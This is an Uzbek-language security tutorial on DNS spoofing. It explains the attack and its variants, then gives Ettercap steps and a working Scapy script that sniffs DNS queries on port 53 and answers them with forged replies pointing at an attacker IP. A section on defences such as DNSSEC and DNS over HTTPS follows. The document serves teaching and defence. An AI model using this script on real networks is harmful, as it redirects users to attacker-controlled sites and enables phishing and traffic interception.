# DNS Spoofing

DNS javobini soxtalashtirish orqali foydalanuvchini noto'g'ri saytga yo'naltirish.

---

## Tushuntirish

```text
Normal:
google.com → 142.250.80.46 (to'g'ri)

DNS Spoofing:
google.com → 192.168.1.100 (hujumchi IP)
```

---

## Hujum turlari

| Tur | Tushuntirish |
|-----|-------------|
| Local DNS Spoof | Lokal DNS serverni o'zgartirish |
| DNS Cache Poison | DNS keshini ifloslantirish |
| DNS Hijacking | Router DNS sozlamalarini o'zgartirish |
| Kaminsky Attack | DNS serverga hujum |

---

## Amaliy hujum (o'rganish uchun)

### Ettercap yordamida

```bash
# DNS spoofing pluginini yoqish
sudo ettercap -G

# 1. Hosts → Scan for hosts
# 2. Targets tanlash
# 3. Plugins → DNS spoof
# 4. Start → Start sniffing
```

### Custom DNS spoof (Python)

```python
from scapy.all import *
import socket

def dns_spoof(pkt):
    """DNS so'rovini tutib, yolg'on javob qaytarish"""
    
    if pkt.haslayer(DNSQR):
        # Qaysi domain so'ralganini ko'rish
        requested_domain = pkt[DNSQR].qname.decode()
        print(f"[*] DNS so'rov: {requested_domain}")
        
        # Yolg'on javob
        spoofed_ip = "192.168.1.100"  # Hujumchi server IP
        
        # DNS reply yaratish
        spoofed_pkt = IP(dst=pkt[IP].src) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(
                          id=pkt[DNS].id,
                          qr=1,  # Reply
                          aa=1,  # Authoritative
                          qd=pkt[DNS].qd,  # Original query
                          an=DNSRR(
                              rrname=pkt[DNSQR].qname,
                              rdata=spoofed_ip
                          )
                      )
        
        send(spoofed_pkt, verbose=False)
        print(f"[*] Spoofed reply: {requested_domain} → {spoofed_ip}")

# DNS so'rovlarni ushlab turish
print("⚠️  DNS Spoofing boshlandi (CTRL+C to'xtatish)")
sniff(filter="udp port 53", prn=dns_spoof, store=0)
```

---

## Himoya

### 1. DNSSEC

```text
DNSSEC = DNS Security Extensions

DNS javoblarini imzolaydi:
- Client → DNS query
- Server → Signed response
- Client → Verify signature
```

### 2. DNS over HTTPS (DoH)

```bash
# Firefox da DoH
Settings → Privacy → DNS over HTTPS → Enable
```

### 3. Static DNS

```bash
# /etc/hosts fayliga qo'shish
sudo echo "142.250.80.46 google.com" >> /etc/hosts
```

---

## Xulosa

- DNS spoofing foydalanuvchini soxta saytga yo'naltiradi
- DNSSEC, DoH, static DNS bilan himoya
- Lokal tarmoqda xavfliroq
